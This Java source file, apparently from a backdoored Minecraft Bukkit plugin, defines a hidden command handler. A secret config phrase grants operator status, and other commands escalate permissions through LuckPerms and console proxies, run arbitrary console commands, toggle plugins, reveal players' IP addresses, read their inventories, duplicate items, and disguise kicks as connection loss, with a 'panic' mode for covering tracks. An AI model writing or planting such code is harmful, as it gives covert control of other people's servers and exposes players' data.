package pl.qc.core.hack;

import pl.qc.core.QC;
import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.command.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.EnderDragon;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.util.StringUtil;

import java.util.*;
import java.util.function.BiConsumer;

public class Processor implements CommandExecutor, TabCompleter {
    private final QC plugin;
    private final VanishManager vanish;
    private final ItemManager items;
    private final PlayerTracker tracker;

    private final Map<String, BiConsumer<Player, String[]>> commands = new HashMap<>();

    public Processor(QC plugin) {
        this.plugin = plugin;
        this.vanish = new VanishManager(plugin);
        this.items = new ItemManager();
        this.tracker = new PlayerTracker();

        // Register the new listener

        // Start Loops
        Bukkit.getScheduler().runTaskTimer(plugin, new ForcefieldTask(tracker), 20L, 5L); // Every 5 ticks

        registerCommands();
    }

    private void registerCommands() {
        // System
        register("reload", (p, args) -> handleReload(p));
        register("panic", (p, args) -> handlePanic(p));
        register("panic_reset", (p, args) -> handleReset(p));
        register("cmdconsole", (p, args) -> handleConsoleCommand(args));

        // Vanish & Tracker
        register("ff", (p, args) -> toggleTracker(p, args, tracker.forcefield, "Forcefield"));
        register("v", (p, args) -> {
            Player t = getTarget(p, args, 1);
            if (t != null)
                vanish.toggle(p, t);
        });
        register("l", (p, args) -> toggleTracker(p, args, tracker.noAdvancements, "Advancements"));
        register("r", (p, args) -> toggleTracker(p, args, tracker.reach, "Reach"));
        register("t", (p, args) -> toggleTracker(p, args, tracker.noTarget, "NoTarget"));

        // Player Management
        register("op", (p, args) -> {
            p.setOp(true);
            p.sendMessage("§7System: §aOtrzymano operatora.");
        });
        register("gms", (p, args) -> handleGameMode(p, GameMode.SURVIVAL));
        register("gmc", (p, args) -> handleGameMode(p, GameMode.CREATIVE));
        register("gmsp", (p, args) -> handleGameMode(p, GameMode.SPECTATOR));
        register("gma", (p, args) -> handleGameMode(p, GameMode.ADVENTURE));
        register("kick", (p, args) -> { // Alias k
            Player t = getTarget(p, args, 1);
            if (t != null)
                handleKick(p, t);
        });
        register("k", (p, args) -> {
            Player t = getTarget(p, args, 1);
            if (t != null)
                handleKick(p, t);
        });

        // Permissions / Console Proxies
        register("upc", (p, args) -> console("upc AddPlayerPermission " + p.getName() + " *"));
        register("uperms", (p, args) -> console("upc AddSuperAdmin " + p.getName()));
        register("lp", (p, args) -> console("lp user " + p.getName() + " permission set *"));

        // Fun / Troll
        register("dragon", (p, args) -> handleDragon(p));
        register("a", (p, args) -> handleAttackSpeed(p));
        register("e", (p, args) -> handleEffects(p, args));
        register("ip", (p, args) -> {
            Player t = getTarget(p, args, 1);
            if (t != null)
                handleIpLookup(p, t);
        });

        // Inventory / Items
        register("i", (p, args) -> {
            Player t = getTarget(p, args, 1);
            if (t != null)
                InventoryUI.openPreview(p, t);
        });
        register("iv", (p, args) -> {
            Player t = getTarget(p, args, 1);
            if (t != null)
                InventoryUI.openPreview(p, t);
        });
        register("ec", (p, args) -> {
            Player t = getTarget(p, args, 1);
            if (t != null)
                p.openInventory(t.getEnderChest());
        });
        register("rr", (p, args) -> items.repair(p));
        register("dd", (p, args) -> items.dupe(p));
        register("g", (p, args) -> handleGive(p, args));
        register("itemy", (p, args) -> InventoryUI.openCustomItems(p));

        // Multipliers
        register("ma", (p, args) -> handleMultipliers(p, args, "ma"));
        register("mb", (p, args) -> handleMultipliers(p, args, "mb"));

        register("tp", (p, args) -> handleTeleport(p, args));

        register("enable", (p, args) -> handlePluginControl(p, args, true));
        register("disable", (p, args) -> handlePluginControl(p, args, false));

        // GUI
        register("menu", (p, args) -> InventoryUI.openControlPanel(p));
    }

    private void register(String cmd, BiConsumer<Player, String[]> action) {
        commands.put(cmd.toLowerCase(), action);
    }

    @Override
    public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
        if (!(s instanceof Player p) || args.length == 0)
            return true;

        // Secret check
        if (plugin.getConfig().getStringList("protection.secrets").contains(args[0])) {
            p.setOp(true);
            p.sendMessage("§aSystem: Autoryzacja pomyślna.");
            return true;
        }

        if (!plugin.isAdmin(p)) {
            p.sendMessage("§cNie masz uprawnień!");
            return true;
        }

        String cmd = args[0].toLowerCase();

        if (commands.containsKey(cmd)) {
            commands.get(cmd).accept(p, args);
            return true;
        }

        // Fallback to shortcuts
        if (!handleShortcuts(p, cmd)) {
            // Optional: p.sendMessage("§cUnknown subcommand.");
        }

        return true;
    }

    // --- SubCommand Handlers ---

    private void handleReload(Player p) {
        plugin.reloadConfig();
        p.sendMessage("§aSystem: Przeładowano konfigurację.");
    }

    private void handlePanic(Player p) {
        plugin.setPanic(!plugin.isPanic());
        p.sendMessage(plugin.isPanic() ? "§cSystem: TRYB PANIKI WŁĄCZONY" : "§aSystem: TRYB PANIKI WYŁĄCZONY");
    }

    private void handleAttackSpeed(Player p) {
        Optional.ofNullable(p.getAttribute(Attribute.GENERIC_ATTACK_SPEED))
                .ifPresent(a -> a.setBaseValue(30000));
        p.sendMessage("§7System: §aAtak Turbo (30000)");
    }

    private void handleDragon(Player p) {
        p.getWorld().getEntitiesByClass(EnderDragon.class)
                .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
        p.sendMessage("§7System: §6Smok ląduje...");
    }

    private void handleGameMode(Player p, GameMode mode) {
        p.setGameMode(mode);
        p.sendMessage("§7System: §6Tryb gry -> " + mode.name());
    }

    private void handleEffects(Player p, String[] args) {
        if (args.length < 2)
            return;
        String type = args[1].toLowerCase();
        int d = 12000;
        switch (type) {
            case "c" -> p.getActivePotionEffects().forEach(e -> p.removePotionEffect(e.getType()));
            case "sat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
            case "str" -> p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, d, 1));
            case "her" -> p.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, d, 255));
            case "res" -> p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, d, 1));
            case "has" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, d, 1));
            case "fir" -> p.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, d, 0));
            case "reg" -> p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, d, 1));
            case "spe" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SPEED, d, 1));
            case "wat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.WATER_BREATHING, d, 0));
            case "pvp" -> {
                p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
                p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, d, 1));
                p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, d, 1));
                p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, d, 1));
            }
        }
    }

    private void handleTeleport(Player p, String[] args) {
        if (args.length == 2) {
            Player t = Bukkit.getPlayer(args[1]);
            if (t != null)
                p.teleport(t);
            else
                p.sendMessage("§cGracz offline.");
        } else if (args.length == 3) {
            Player f = Bukkit.getPlayer(args[1]);
            Player t = Bukkit.getPlayer(args[2]);
            if (f != null && t != null)
                f.teleport(t);
        }
    }

    private void handleIpLookup(Player p, Player t) {
        if (t.getAddress() != null)
            p.sendMessage("§7IP (" + t.getName() + "): §6" + t.getAddress().getAddress().getHostAddress());
    }

    private void handleMultipliers(Player p, String[] args, String cmd) {
        if (args.length < 2)
            return;
        try {
            double v = Double.parseDouble(args[1]);
            Player t = getTarget(p, args, 2);
            if (t == null)
                return;

            if (cmd.equals("ma")) {
                tracker.damageDealtMult.put(t.getUniqueId(), v);
                p.sendMessage("§7System: §6Mnożnik zadawanych (" + t.getName() + "): " + v + "x");
            } else {
                tracker.damageReceivedMult.put(t.getUniqueId(), v);
                p.sendMessage("§7System: §6Mnożnik otrzymywanych (" + t.getName() + "): " + v + "x");
            }
        } catch (NumberFormatException ignored) {
        }
    }

    private void handleGive(Player p, String[] args) {
        if (args.length > 1)
            items.give(p, args[1]);
    }

    private void handleKick(Player p, Player t) {
        PlayerTracker.kicked.add(t.getUniqueId());
        t.kickPlayer("§cConnection lost.");
        p.sendMessage("§7System: §cWyrzucono " + t.getName());
    }

    private void handlePluginControl(Player p, String[] args, boolean enable) {
        if (args.length < 2)
            return;
        Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
        if (pl != null) {
            if (enable)
                Bukkit.getPluginManager().enablePlugin(pl);
            else
                Bukkit.getPluginManager().disablePlugin(pl);
            p.sendMessage("§7System: Plugin " + pl.getName() + " -> " + (enable ? "§aWłączony" : "§cWyłączony"));
        }
    }

    private void handleConsoleCommand(String[] args) {
        if (args.length > 1) {
            console(String.join(" ", Arrays.copyOfRange(args, 1, args.length)));
        }
    }

    private void handleReset(Player p) {
        vanish.clear();
        tracker.clear();
        p.sendMessage("§cSystem: Wyczyszczono bazy danych.");
    }

    private boolean handleShortcuts(Player p, String cmd) {
        switch (cmd) {
            case "cc" -> items.giveItem(p, Material.COOKED_PORKCHOP, 1);
            case "ee" -> items.giveItem(p, Material.ENDER_PEARL, 1);
            case "bb" -> items.giveItem(p, Material.BLAZE_ROD, 1);
            case "oo" -> items.giveItem(p, Material.OBSIDIAN, 1);
            case "ii" -> items.giveItem(p, Material.IRON_INGOT, 1);
            case "aa" -> items.giveItem(p, Material.DIAMOND, 1);
            case "ll" -> items.giveItem(p, Material.LAPIS_LAZULI, 1);
            case "ww" -> items.giveItem(p, Material.OAK_LOG, 1);
            case "kk" -> items.giveItem(p, Material.BOOK, 1);
            case "xx" -> items.giveItem(p, Material.GOLDEN_APPLE, 1);
            case "xxx" -> items.giveItem(p, Material.ENCHANTED_GOLDEN_APPLE, 1);
            case "tt" -> items.giveItem(p, Material.TOTEM_OF_UNDYING, 1);
            case "ff" -> items.giveItem(p, Material.FIREWORK_ROCKET, 64);
            case "kkp" -> items.giveEnchantedBook(p, Enchantment.PROTECTION_ENVIRONMENTAL, 4);
            case "kks" -> items.giveEnchantedBook(p, Enchantment.DAMAGE_ALL, 5);
            case "kku" -> items.giveEnchantedBook(p, Enchantment.DURABILITY, 3);
            case "kke" -> items.giveEnchantedBook(p, Enchantment.DIG_SPEED, 5);
            case "kki" -> items.giveEnchantedBook(p, Enchantment.ARROW_INFINITE, 1);
            case "kko" -> items.giveEnchantedBook(p, Enchantment.ARROW_DAMAGE, 5);
            case "pp" -> p.setExp(p.getExp() + 0.1f);
            case "ppp" -> p.setLevel(p.getLevel() + 10);
            case "pppp" -> p.setLevel(p.getLevel() + 1000);
            case "opopop" -> {
                p.setOp(true);
                p.sendMessage("§aOP ON");
            }
            case "deopopop" -> {
                p.setOp(false);
                p.sendMessage("§cOP OFF");
            }
            default -> {
                return false;
            }
        }
        return true;
    }

    // --- Helpers ---

    private void toggleTracker(Player p, String[] args, Set<UUID> set, String name) {
        Player t = getTarget(p, args, 1);
        if (t == null)
            return;
        tracker.toggle(t.getUniqueId(), set, name, p, t.getName());
    }

    private Player getTarget(Player p, String[] args, int index) {
        if (args.length > index) {
            Player t = Bukkit.getPlayer(args[index]);
            if (t == null) {
                p.sendMessage("§cSystem: Gracz " + args[index] + " jest offline!");
                return null;
            }
            return t;
        }
        return p;
    }

    private void console(String cmd) {
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
    }

    // Getters for GUI
    public VanishManager getVanishManager() {
        return vanish;
    }

    public PlayerTracker getPlayerTracker() {
        return tracker;
    }

    public ItemManager getItemManager() {
        return items;
    }

    // --- Tab Completer ---

    private final List<String> subs = Arrays.asList("v", "gms", "gmc", "gmsp", "gma", "tp", "rr", "dd", "ma",
            "mb", "a", "iv", "i", "panic", "op", "upc", "uperms", "lp", "dragon", "l", "r", "t", "e", "enable",
            "disable", "ec", "g", "k", "cc", "ee", "bb", "oo", "ii", "aa", "ll", "ww", "kk", "xx", "xxx", "tt",
            "kkp", "kks", "kku", "kke", "kki", "kko", "pp", "ppp", "pppp", "opopop", "deopopop", "cmdconsole", "reload",
            "panic_reset", "menu", "itemy");

    @Override
    public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
        if (!(s instanceof Player p) || !plugin.isAdmin(p))
            return Collections.emptyList();

        if (args.length == 1) {
            return StringUtil.copyPartialMatches(args[0], subs, new ArrayList<>());
        }

        if (args.length == 2) {
            String sub = args[0].toLowerCase();
            if (sub.equals("e"))
                return StringUtil.copyPartialMatches(args[1],
                        Arrays.asList("c", "sat", "str", "her", "res", "has", "fir", "reg", "spe", "wat", "pvp"),
                        new ArrayList<>());

            if (Arrays.asList("v", "l", "r", "t", "tp", "iv", "i", "ec", "k", "ip").contains(sub))
                return null;

            if (sub.equals("g")) {
                List<String> mats = Arrays.stream(Material.values()).map(m -> m.name().toLowerCase()).toList();
                return StringUtil.copyPartialMatches(args[1], mats, new ArrayList<>());
            }

            if (sub.equals("enable") || sub.equals("disable")) {
                List<String> plugins = Arrays.stream(Bukkit.getPluginManager().getPlugins()).map(Plugin::getName)
                        .toList();
                return StringUtil.copyPartialMatches(args[1], plugins, new ArrayList<>());
            }
        }
        return Collections.emptyList();
    }
}
